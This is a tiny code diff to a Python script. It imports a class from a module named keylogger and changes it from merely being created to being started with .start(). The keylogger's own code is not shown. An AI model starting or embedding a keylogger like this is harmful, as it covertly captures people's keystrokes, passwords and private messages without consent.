@@ -1,3 +1,3 @@
 from keylogger import Keylogger
 
-Keylogger()
+Keylogger().start()
